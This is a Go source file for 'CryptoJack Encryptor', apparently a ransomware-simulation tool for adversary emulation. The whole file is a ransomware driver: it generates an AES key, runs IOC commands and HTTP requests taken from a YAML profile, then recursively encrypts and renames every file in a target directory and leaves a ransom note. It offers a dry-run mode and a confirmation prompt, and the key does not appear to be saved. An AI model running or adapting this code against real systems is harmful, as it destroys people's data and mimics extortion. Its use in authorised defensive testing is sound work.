package main

import (
	"flag"
	"fmt"
	"math/rand"
	"os"
	"time"

	"cryptojack/cjlib"
)

func main() {
	rand.Seed(time.Now().Unix())
	const banner = `
_________________________________________________

    ╔═╗┬─┐┬ ┬┌─┐┌┬┐┌─┐ ╦┌─┐┌─┐┬┌─
    ║  ├┬┘└┬┘├─┘ │ │ │ ║├─┤│  ├┴┐
    ╚═╝┴└─ ┴ ┴   ┴ └─┘╚╝┴ ┴└─┘┴ ┴
    ENCRYPTOR
	
    Version 1.0.1 by Joff Thyer
    Black Hills Information Security
    Copyright (c) 2022
__________________________________________________
`

	fmt.Println(banner)
	arg_exclude := flag.String("e", "exe, dll", "filename extensions which will be excluded")
	arg_dryrun := flag.Bool("n", false, "perform a dryrun without any encryption actions")
	arg_norename := flag.Bool("norename", false, "Dont rename files to encrypted filename + extension")
	arg_cryptext := flag.String("ext", ".cryptojack", "file extension to use for renamed content")
	arg_directory := flag.String("d", "", "Specify a starting directory. This is required.")
    arg_yaml := flag.String("y", "", "Specify a YAML IOC profile file name.")
	flag.Parse()

	// AES encryption key
	aeskey := cjlib.NewEncryptionKey()
    if len(*arg_directory) == 0 {
        panic("you must specify the -d <directory> option")
    }
	if *arg_dryrun {
		fmt.Println("[*] DRY RUN Mode: No files will be encrypted.")
	} else {
		fmt.Printf(`
[*] --<[ WARNING ]>--    --<[ WARNING ]>--    --<[ WARNING ]>--
[*]
[*] You are about to encrypt ALL files recursively in the target
[*] directory: [%s]
[*]
[*] --<[ WARNING ]>--    --<[ WARNING ]>--    --<[ WARNING ]>--
`, *arg_directory)
		fmt.Printf("\n\r[*] DO YOU REALLY WANT TO PROCEED [Y|N]? ")
		ans := []byte("N")
		os.Stdin.Read(ans)
		if ans[0] != 89 {
			os.Exit(0)
		}
	}

    var config cjlib.YAML_CONFIG
    var err error
    file_ext := *arg_cryptext
    if len(*arg_yaml) > 0 {
        config, err = cjlib.ReadYamlConfig(*arg_yaml)
        if (err != nil) { panic(err) }
        if len(config.File_extension) > 0 {
            file_ext = config.File_extension
        }
    }
    fmt.Printf("\r\n\n[*] =============================================================\n")
    fmt.Printf("[*]  Creating IOC Activity from [%s]\n", *arg_yaml)
    fmt.Printf("[*] =============================================================\n")
    cjlib.Request_IOC_Commands(config)
    cjlib.Request_IOC_HTTP(config)

    // Encrypting directory structure
	_, _, _, err = cjlib.EncryptDirectoryStructure(
		*arg_directory, aeskey, *arg_exclude,
		file_ext, config.Ransom_note, *arg_norename, *arg_dryrun)
	if err != nil {
		fmt.Printf("[-] %s\n", err.Error())
        os.Exit(1)
	}
}
